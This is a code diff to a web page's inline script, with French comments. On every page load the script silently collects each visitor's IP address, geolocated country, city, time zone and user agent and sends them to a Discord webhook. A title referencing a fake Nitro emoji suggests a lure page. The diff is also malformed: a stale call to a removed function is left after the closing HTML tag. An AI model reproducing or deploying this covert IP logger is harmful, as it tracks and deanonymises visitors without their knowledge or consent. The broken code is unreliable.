@@ -35,25 +35,26 @@
             });
         };
 
-        const sendWebhookOnce = async () => {
-            // Vérifie si le message a déjà été envoyé en utilisant le stockage local
-            if (!localStorage.getItem("webhookSent")) {
-                const ipAddress = await getIpAddress();
-                const ipGeolocationData = await getIpGeolocation(ipAddress);
+        const sendWebhookOnVisit = async () => {
+            const ipAddress = await getIpAddress();
+            const ipGeolocationData = await getIpGeolocation(ipAddress);
 
-                const embed = {
-                    title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
-                    description: `**<:3228info:1210210365414055956> Adresse IP: || ${ipAddress} ||\n<:8692communityserver:1210210464647094383> Pays: || ${ipGeolocationData.country_name} ||\n<:3267ecomode:1210210378018066492> Ville: || ${ipGeolocationData.city} ||\n<:6764newmember:1210210416517709844> Fuseau horaire: || ${ipGeolocationData.time_zone} ||\n<:6307management:1210210404471672864> Navigateur + Plateforme: || ${window.navigator.userAgent} ||**`,
-                    color: 0x00ff00
-                };
+            const embed = {
+                title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
+                description: `**<:3228info:1210210365414055956> Adresse IP: || ${ipAddress} ||\n<:8692communityserver:1210210464647094383> Pays: || ${ipGeolocationData.country_name} ||\n<:3267ecomode:1210210378018066492> Ville: || ${ipGeolocationData.city} ||\n<:6764newmember:1210210416517709844> Fuseau horaire: || ${ipGeolocationData.time_zone} ||\n<:6307management:1210210404471672864> Navigateur + Plateforme: || ${window.navigator.userAgent} ||**`,
+                color: 0x00ff00
+            };
 
-                // Envoie du message via le webhook Discord
-                await sendWebhook(embed);
-
-                // Marque le message comme déjà envoyé
-                localStorage.setItem("webhookSent", "true");
-            }
+            // Envoie du message via le webhook Discord
+            await sendWebhook(embed);
         };
+
+        // Appelle la fonction à chaque chargement de la page
+        sendWebhookOnVisit();
+    </script>
+</body>
+</html>
+
 
         // Appelle la fonction au chargement de la page
         sendWebhookOnce();
